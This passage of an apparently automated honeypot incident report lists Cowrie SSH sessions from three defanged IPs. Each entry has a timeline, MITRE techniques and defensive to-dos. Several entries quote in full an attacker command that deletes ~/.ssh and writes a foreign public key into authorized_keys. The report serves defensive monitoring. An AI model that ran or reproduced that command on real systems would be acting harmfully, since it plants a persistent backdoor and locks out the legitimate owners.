| **First Seen** | 2026-04-14 09:49 |
| **Last Seen** | 2026-04-14 09:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:49:33` | `cowrie.session.connect` |
| `2026-04-14 09:49:33` | `cowrie.client.version` |
| `2026-04-14 09:49:33` | `cowrie.client.kex` |
| `2026-04-14 09:49:34` | `cowrie.login.success` |
| `2026-04-14 09:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-406844ffb9f6

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:54 |
| **Last Seen** | 2026-04-14 09:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:54:00` | `cowrie.session.connect` |
| `2026-04-14 09:54:00` | `cowrie.client.version` |
| `2026-04-14 09:54:00` | `cowrie.client.kex` |
| `2026-04-14 09:54:00` | `cowrie.login.success` |
| `2026-04-14 09:54:00` | `cowrie.session.params` |
| `2026-04-14 09:54:00` | `cowrie.command.input` |
| `2026-04-14 09:54:00` | `cowrie.command.failed` |
| `2026-04-14 09:54:00` | `cowrie.log.closed` |
| `2026-04-14 09:54:01` | `cowrie.session.params` |
| `2026-04-14 09:54:01` | `cowrie.command.input` |
| `2026-04-14 09:54:01` | `cowrie.session.file_download` |
| `2026-04-14 09:54:01` | `cowrie.log.closed` |
| `2026-04-14 09:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d454d2b82ecc

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:54 |
| **Last Seen** | 2026-04-14 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:54:02` | `cowrie.session.connect` |
| `2026-04-14 09:54:02` | `cowrie.client.version` |
| `2026-04-14 09:54:02` | `cowrie.client.kex` |
| `2026-04-14 09:54:03` | `cowrie.login.success` |
| `2026-04-14 09:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-893d24421e0e

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:54 |
| **Last Seen** | 2026-04-14 09:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:54:08` | `cowrie.session.connect` |
| `2026-04-14 09:54:08` | `cowrie.client.version` |
| `2026-04-14 09:54:08` | `cowrie.client.kex` |
| `2026-04-14 09:54:09` | `cowrie.login.success` |
| `2026-04-14 09:54:10` | `cowrie.session.params` |
| `2026-04-14 09:54:10` | `cowrie.command.input` |
| `2026-04-14 09:54:10` | `cowrie.command.failed` |
| `2026-04-14 09:54:10` | `cowrie.log.closed` |
| `2026-04-14 09:54:10` | `cowrie.session.params` |
| `2026-04-14 09:54:10` | `cowrie.command.input` |
| `2026-04-14 09:54:10` | `cowrie.session.file_download` |
| `2026-04-14 09:54:10` | `cowrie.log.closed` |
| `2026-04-14 09:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc44dd690ece

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:54 |
| **Last Seen** | 2026-04-14 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:54:13` | `cowrie.session.connect` |
| `2026-04-14 09:54:13` | `cowrie.client.version` |
| `2026-04-14 09:54:13` | `cowrie.client.kex` |
| `2026-04-14 09:54:14` | `cowrie.login.success` |
| `2026-04-14 09:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e18e4936c33

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:57 |
| **Last Seen** | 2026-04-14 09:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:57:22` | `cowrie.session.connect` |
| `2026-04-14 09:57:22` | `cowrie.client.version` |
| `2026-04-14 09:57:22` | `cowrie.client.kex` |
| `2026-04-14 09:57:22` | `cowrie.login.success` |
| `2026-04-14 09:57:23` | `cowrie.session.params` |
| `2026-04-14 09:57:23` | `cowrie.command.input` |
| `2026-04-14 09:57:23` | `cowrie.command.failed` |
| `2026-04-14 09:57:23` | `cowrie.log.closed` |
| `2026-04-14 09:57:23` | `cowrie.session.params` |
| `2026-04-14 09:57:23` | `cowrie.command.input` |
| `2026-04-14 09:57:23` | `cowrie.session.file_download` |
| `2026-04-14 09:57:23` | `cowrie.log.closed` |
| `2026-04-14 09:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc293bd3a9df

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 09:57 |
| **Last Seen** | 2026-04-14 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:57:25` | `cowrie.session.connect` |
| `2026-04-14 09:57:25` | `cowrie.client.version` |
| `2026-04-14 09:57:25` | `cowrie.client.kex` |
| `2026-04-14 09:57:25` | `cowrie.login.success` |
| `2026-04-14 09:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659e7f4360f6

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:58 |
| **Last Seen** | 2026-04-14 09:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:58:50` | `cowrie.session.connect` |
| `2026-04-14 09:58:50` | `cowrie.client.version` |
| `2026-04-14 09:58:51` | `cowrie.client.kex` |
| `2026-04-14 09:58:51` | `cowrie.login.success` |
| `2026-04-14 09:58:52` | `cowrie.session.params` |
| `2026-04-14 09:58:52` | `cowrie.command.input` |
| `2026-04-14 09:58:52` | `cowrie.command.failed` |
| `2026-04-14 09:58:52` | `cowrie.log.closed` |
| `2026-04-14 09:58:53` | `cowrie.session.params` |
| `2026-04-14 09:58:53` | `cowrie.command.input` |
| `2026-04-14 09:58:53` | `cowrie.session.file_download` |
| `2026-04-14 09:58:53` | `cowrie.log.closed` |
| `2026-04-14 09:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e3ea056653

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 09:58 |
| **Last Seen** | 2026-04-14 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:58:56` | `cowrie.session.connect` |
| `2026-04-14 09:58:56` | `cowrie.client.version` |
| `2026-04-14 09:58:56` | `cowrie.client.kex` |
| `2026-04-14 09:58:57` | `cowrie.login.success` |
| `2026-04-14 09:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886707baa2da

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 09:59 |
| **Last Seen** | 2026-04-14 09:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:59:05` | `cowrie.session.connect` |
| `2026-04-14 09:59:05` | `cowrie.client.version` |
| `2026-04-14 09:59:05` | `cowrie.client.kex` |
| `2026-04-14 09:59:06` | `cowrie.login.success` |
| `2026-04-14 09:59:07` | `cowrie.session.params` |
| `2026-04-14 09:59:07` | `cowrie.command.input` |
| `2026-04-14 09:59:07` | `cowrie.command.failed` |
| `2026-04-14 09:59:07` | `cowrie.log.closed` |
| `2026-04-14 09:59:08` | `cowrie.session.params` |
| `2026-04-14 09:59:08` | `cowrie.command.input` |
| `2026-04-14 09:59:08` | `cowrie.session.file_download` |
| `2026-04-14 09:59:08` | `cowrie.log.closed` |
| `2026-04-14 09:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df03591bdfd9

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 09:59 |
| **Last Seen** | 2026-04-14 09:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:59:12` | `cowrie.session.connect` |
| `2026-04-14 09:59:12` | `cowrie.client.version` |
| `2026-04-14 09:59:13` | `cowrie.client.kex` |
| `2026-04-14 09:59:14` | `cowrie.login.success` |
| `2026-04-14 09:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d18ce30fbfb

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:01 |
| **Last Seen** | 2026-04-14 10:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:01:04` | `cowrie.session.connect` |
| `2026-04-14 10:01:04` | `cowrie.client.version` |
| `2026-04-14 10:01:05` | `cowrie.client.kex` |
| `2026-04-14 10:01:06` | `cowrie.login.success` |
| `2026-04-14 10:01:06` | `cowrie.session.params` |
| `2026-04-14 10:01:06` | `cowrie.command.input` |
| `2026-04-14 10:01:06` | `cowrie.command.failed` |
| `2026-04-14 10:01:07` | `cowrie.log.closed` |
| `2026-04-14 10:01:07` | `cowrie.session.params` |
| `2026-04-14 10:01:07` | `cowrie.command.input` |
| `2026-04-14 10:01:08` | `cowrie.session.file_download` |
| `2026-04-14 10:01:08` | `cowrie.log.closed` |
| `2026-04-14 10:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8958a41f1070

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:01 |
| **Last Seen** | 2026-04-14 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:01:12` | `cowrie.session.connect` |
| `2026-04-14 10:01:12` | `cowrie.client.version` |
| `2026-04-14 10:01:12` | `cowrie.client.kex` |
| `2026-04-14 10:01:14` | `cowrie.login.success` |
| `2026-04-14 10:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d1a1d8f946

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:02 |
| **Last Seen** | 2026-04-14 10:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:02:40` | `cowrie.session.connect` |
| `2026-04-14 10:02:40` | `cowrie.client.version` |
| `2026-04-14 10:02:40` | `cowrie.client.kex` |
| `2026-04-14 10:02:41` | `cowrie.login.success` |
| `2026-04-14 10:02:41` | `cowrie.session.params` |
| `2026-04-14 10:02:41` | `cowrie.command.input` |
| `2026-04-14 10:02:41` | `cowrie.command.failed` |
| `2026-04-14 10:02:41` | `cowrie.log.closed` |
| `2026-04-14 10:02:41` | `cowrie.session.params` |
| `2026-04-14 10:02:41` | `cowrie.command.input` |
| `2026-04-14 10:02:41` | `cowrie.session.file_download` |
| `2026-04-14 10:02:41` | `cowrie.log.closed` |
| `2026-04-14 10:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa3cea688a9

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:02 |
| **Last Seen** | 2026-04-14 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:02:43` | `cowrie.session.connect` |
| `2026-04-14 10:02:43` | `cowrie.client.version` |
| `2026-04-14 10:02:43` | `cowrie.client.kex` |
| `2026-04-14 10:02:43` | `cowrie.login.success` |
| `2026-04-14 10:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b48e1c1f69b

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:03 |
| **Last Seen** | 2026-04-14 10:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:03:54` | `cowrie.session.connect` |
| `2026-04-14 10:03:54` | `cowrie.client.version` |
| `2026-04-14 10:03:54` | `cowrie.client.kex` |
| `2026-04-14 10:03:55` | `cowrie.login.success` |
| `2026-04-14 10:03:56` | `cowrie.session.params` |
| `2026-04-14 10:03:56` | `cowrie.command.input` |
| `2026-04-14 10:03:56` | `cowrie.command.failed` |
| `2026-04-14 10:03:56` | `cowrie.log.closed` |
| `2026-04-14 10:03:56` | `cowrie.session.params` |
| `2026-04-14 10:03:56` | `cowrie.command.input` |
| `2026-04-14 10:03:57` | `cowrie.session.file_download` |
| `2026-04-14 10:03:57` | `cowrie.log.closed` |
| `2026-04-14 10:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87194d530a28

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:03 |
| **Last Seen** | 2026-04-14 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:03:59` | `cowrie.session.connect` |
| `2026-04-14 10:03:59` | `cowrie.client.version` |
| `2026-04-14 10:03:59` | `cowrie.client.kex` |
| `2026-04-14 10:04:00` | `cowrie.login.success` |
| `2026-04-14 10:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef06ac320f96

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:04 |
| **Last Seen** | 2026-04-14 10:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
